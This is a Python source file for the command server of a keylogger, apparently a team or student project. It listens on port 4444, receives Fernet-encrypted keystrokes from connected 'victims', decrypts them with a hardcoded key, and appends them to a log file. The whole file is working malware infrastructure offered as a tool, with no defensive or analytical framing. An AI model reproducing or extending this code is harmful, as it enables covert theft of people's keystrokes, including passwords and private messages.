import socket # for network communication 
import sys  # interacting with Python Interpreter
from cryptography.fernet import Fernet, InvalidToken # Fernet library, uses synmetric key for encrypting and decrypting

class Server():

   def __init__(self, Host, Port, crypt_key):
    
     self.__Host = Host
     self.__Port = Port
     self.__crypt = Fernet(crypt_key) # Fernet secret key object for encryption

   # Method for handling the victim
   def handle_victim(self, conn, addr):

      # addr[0] is victim IP and addr[1] is the Port
      print(f"Connected from {addr[0]}:{addr[1]}")

      try: 
            while True:

               # wait to recieve data from connected victim, pause the program until some data is received
               data = conn.recv(1024)
               
               # executes if the victim return an empty byte (b'') aka. victim disconnected
               if not data:

                  print(f"Victim {addr[0]} has disconnected")
                  break 
               
               try: 
                     # print raw encrypted bytes for verification
                     print(f'{addr[0]}: encrypted data: {data}')
                     # decrypt and decode the received bytes into readable text
                     decode_msg = self.__crypt.decrypt(data).decode('utf-8')

                     with open("keylogger.txt", 'a') as f:
                        # Append the decrypted keystrokes to the log file
                        f.write(decode_msg)
                        
               # Handle corrupted data that failed the decryption check
               except InvalidToken:
                     
                     print(f"Invalid Token from {addr[0]}")
                     continue
      # ConnectionResetError occurs when a network connection is closed abruptly by the remote peer
      except ConnectionResetError:

         print(f"{addr[0]} has disconnected")

      finally:
         # close the connection between the victim
         conn.close() 
         
   def start_server(self):
     
      # creating socket
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         Adress = (self.__Host, self.__Port)
         s.bind(Adress)    # bind the IP and Port to the socket
         s.listen(1)       # Put the socket into listening mode  
         print(f"Server is listening on {self.__Host}:{self.__Port}")
         print("Listening for connection...")

         try:

            while True:
               
               # accept() method is used on the server-side listening socket to accept incoming client connection
               # it also pauses the program until a client connects
               conn, addr = s.accept()

               self.handle_victim(conn, addr)

          # manually closing the Server socket
         except KeyboardInterrupt:

            print("Server is shutting down, due to KeyboardInterruption")
         
         finally: 
            
            s.close() # close the socket to free up resource
            print("Socket has been closed.")
            sys.exit(0) # terminate the program

if __name__ == '__main__':

   print("""
     ▄▄▄▄▄              ▄▄▄                 
    ██▀▀▀▀█▄           █▀██  ██             
 ▀▀ ▀██▄  ▄▀             ██  ██             
 ██   ▀██▄▄  ▄█▀█▄ ▄█▀█▄ ██  ██  ▄███▄ ██ ██
 ██ ▄   ▀██▄ ██▄█▀ ██▄█▀ ██  ██  ██ ██ ██ ██
▄██ ▀██████▀▄▀█▄▄▄▄▀█▄▄▄ ▀█████▄▄▀███▀▄▀██▀█
                         ▄   ██             
                         ▀████▀             """)
   
   print("==== G2, Team2 ====")

   Host = "0.0.0.0" # Server IP listening on every interfaces
   Port = 4444 # Server Port

   KEY = b"GLpnLBTkUsqcwT5TYpMgQT0c-W_Ust13ybM3ZK5whj8=" # keys for decrypting

   server = Server(Host, Port, KEY) 

   server.start_server()  

